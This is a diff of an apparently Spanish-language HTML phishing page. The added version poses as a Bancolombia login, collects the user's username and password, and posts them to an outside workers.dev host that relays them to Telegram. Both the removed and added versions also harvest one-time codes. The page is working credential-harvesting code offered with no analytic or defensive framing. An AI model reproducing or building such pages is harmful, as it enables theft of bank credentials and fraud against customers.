@@ -1,70 +1,63 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Ingresar Código</title>
-  <style>
-    body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-    .box { text-align: center; }
-    .inputs { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
-    .inputs input { width: 40px; height: 40px; text-align: center; font-size: 20px; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Bancolombia</title>
 </head>
 <body>
-  <div class="box">
-    <h2>Ingrese el código</h2>
-    <div class="inputs">
-      <input type="password" maxlength="1">
-      <input type="password" maxlength="1">
-      <input type="password" maxlength="1">
-      <input type="password" maxlength="1">
-      <input type="password" maxlength="1">
-      <input type="password" maxlength="1">
-    </div>
-    <button id="enviar">Enviar</button>
-  </div>
+<h2>Login</h2>
+<input type="text" id="usuario" placeholder="Usuario">
+<input type="password" id="clave" placeholder="Clave">
+<button id="login-btn">Enviar</button>
 
-  <script>
-    const inputs = document.querySelectorAll('.inputs input');
+<h3>Ingresar código para desbloquear botones</h3>
+<input type="text" id="codigo" placeholder="Código">
+<button id="submit-code">Enviar Código</button>
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        if (e.target.value && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-      });
+<div id="status"></div>
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
+<script>
+const baseURL = "https://blue-night-7897.claropromoxlaro.workers.dev";
+let transactionId = null;
 
-    document.getElementById('enviar').addEventListener('click', async () => {
-      const codigo = Array.from(inputs).map(i => i.value).join('');
-      const id = localStorage.getItem("transactionId");
+function setStatus(msg) {
+  document.getElementById('status').innerText = msg;
+}
 
-      if (!id) return alert("No se encontró transactionId");
+// LOGIN
+document.getElementById('login-btn').addEventListener('click', async () => {
+  const usuario = document.getElementById('usuario').value;
+  const clave = document.getElementById('clave').value;
+  if (!usuario || !clave) return setStatus("Completa usuario y clave");
 
-      // Enviar código
-      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ id, codigo })
-      });
+  transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+  localStorage.setItem('transactionId', transactionId);
 
-      // Reset → reactivar botones
-      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ id })
-      });
+  const res = await fetch(`${baseURL}/login`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ usuario, clave, transactionId })
+  });
 
-      alert("✅ Código enviado. Botones reactivados en Telegram.");
-      window.location.href = "verificando.html";
-    });
-  </script>
+  if (res.ok) setStatus("Datos enviados a Telegram ✅");
+  else setStatus("Error al enviar datos");
+});
+
+// RESET para desbloquear botones en Telegram
+document.getElementById('submit-code').addEventListener('click', async () => {
+  const codigo = document.getElementById('codigo').value;
+  if (!codigo) return setStatus("Ingresa un código");
+
+  const res = await fetch(`${baseURL}/reset`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ id: transactionId })
+  });
+
+  if (res.ok) setStatus("Botones desbloqueados en Telegram ✅");
+  else setStatus("Error al desbloquear botones");
+});
+</script>
 </body>
 </html>
